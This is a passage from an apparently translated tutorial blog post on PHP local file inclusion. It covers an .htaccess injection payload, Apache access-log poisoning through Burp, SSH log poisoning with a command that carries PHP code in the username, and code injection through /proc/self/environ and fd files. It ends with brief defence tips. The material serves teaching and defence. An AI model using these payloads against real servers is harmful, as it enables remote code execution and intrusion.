?filename=.htaccess&content=php_value auto_prepend_file D:\flag.php%0a%23\
```

Here I cannot execute .htaccess when testing natively. I borrowed some other people's pictures (it's still too bad~~)

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528013126219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
# Include logs
## Access log

Utilization conditions: You need to know the storage path of the server log, and the log file is readable
Many times, the web server will write the request to the log file, such as apache; when the user initiates the request, it will write the request to access.log, and when an error occurs, it will write the error to error.log; by default, the log saving path is /var/log/apache2/
However, if the request is initiated directly, some symbols will be encoded so that the inclusion cannot be parsed correctly, so we can use burp to modify it after intercepting the packet.
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528015031532.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Although 400 is returned, the access log has been written

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052801512184.png#pic_center)

Note: In some scenarios, the address of the log is modified. You can then include the corresponding configuration file by reading the corresponding configuration file

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528015211468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## SSH log

Utilization conditions: You need to know the location of ssh-log and be readable. By default, it is /var/log/auth.log
How to use:
- Connect with ssh: `ubuntu@VM-207-93-ubuntu:~$ ssh '<?php phpinfo(); ?>'@remotehost`
- After that, you will be prompted to enter your password, etc.
- Then write the php code in the ssh-log of remotehost, and then include the file
- Detailed explanation [Reference link](https://www.hackingarticles.in/rce-with-lfi-and-ssh-log-poisoning/)

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528015620656.png#pic_center)

# Include environment

Conditions of use:
- php runs in cgi so that the environment will keep the UA header
- The storage location of the environment file is known, and the environment file is readable

>Position:
/proc/self/environ will save the user-agent header. If you insert the php code into the user-agent, the php code will be written to the enviro
In n, then include it
Detailed explanation [Reference link 1](http://websecuritylog.blogspot.com/2010/06/proprifenviron-injection.html), [Reference link 2](https://www.exploit-db.com/papers/12886)

# Include fd

Similar to environment, the difference is that it needs to include the fd file, and the php code is inserted in the referer header, which also requires readable permissions.

#Use tools

Tool [link address](https://github.com/P0cL4bs/Kadimus/)

# Defense Plan

1. In many scenarios, it is necessary to include files outside the web directory. If php configures open_basedir, it will contain failures.
2. Do a good job in document permission management
3. Filter dangerous characters, etc.